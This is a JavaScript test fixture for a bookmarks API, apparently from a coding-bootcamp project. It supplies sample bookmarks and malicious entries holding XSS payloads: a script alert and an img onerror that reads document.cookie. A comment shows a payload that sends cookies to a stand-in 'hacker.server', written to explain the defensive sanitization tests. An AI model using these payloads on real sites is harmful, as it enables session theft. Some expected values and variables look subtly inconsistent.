function makeBookmarksArray() {
    return [
        {
            id: 1, title:'W3 SCHOOL',
            url: 'https://www.w3schools.com/',
            description: 'THE WORLDS LARGEST WEB DEVELOPER SITE',
            rating:5
        },
        {
            id: 2, title:'THINKFUL',
            url: 'https://www.thinkful.com/',
            description: 'Coding Bootcamp',
            rating:5
        },
        {
            id: 3, title:'MDN WEB DOCS',
            url: 'https://developer.mozilla.org/en-US/',
            description: 'Resources for Developers, by Developers',
            rating:5
        },
        
    ]
}
const attack1= `<script>alert("xss")</script>`;
const sanitizedAttack1= '&lt;script&gt;alert(\"xss\");&lt;/script&gt'

const attack2= `<img src="https://url.to.file.which/does-not.exist" onerror="alert(document.cookie)">`;
const sanitizedAttack2= `<img src="https://url.to.file.which/does-not.exist">`

//onerror attr is used to to execute the malicious JS when the load fails
/*in real world attack, the hackers might use fetch insted of alert to send private data from our browser to some servers that they control, for ex: 
<img src="https://url.to.file.which/does-not.exist" onerror="fetch('https://hacker.server/', {mehtod:'POST', body: document.cookie})">*/

function makeMaliciousBookmark() {
    const maliciousBookmark = {
        id,
        url,
        title: attack1 ,
        description: attack2
    }

    const expectedBookmark = {
        ...maliciousBookmark,
        title: sanitizedAttack1,
        description: sanitizedAttack2
    }
    return {
        maliciousBookmark,
        expectedBookmark
    }
}
module.exports = {
    makeBookmarksArray,
    makeMaliciousBookmark
}